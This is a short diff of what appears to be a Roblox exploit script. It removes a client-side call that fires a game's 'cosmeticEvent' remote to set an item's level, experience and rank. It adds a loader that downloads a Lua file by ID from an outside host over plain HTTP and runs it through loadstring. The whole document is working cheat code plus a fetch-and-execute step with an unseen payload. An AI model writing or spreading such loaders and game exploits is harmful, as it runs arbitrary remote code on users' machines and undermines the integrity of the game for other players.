@@ -1,13 +1,3 @@
-local args = {
-    [1] = "Change",
-    [2] = {
-        ["ID"] = 41,
-        ["Level"] = 100,
-        ["Exp"] = 0,
-        ["Rank"] = 1
-    },
-    [3] = {},
-    [4] = {}
-}
-
-game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("cosmeticEvent"):FireServer(unpack(args))
+script_id = "67b942fc73b4ee85689a35850296af9b" 
+USE_NON_SSL_NODE = true;
+loadstring(game:HttpGet("http://cappy.felinemastery.xyz/files/v3/l/" .. script_id .. ".lua"))({ WS=80 })
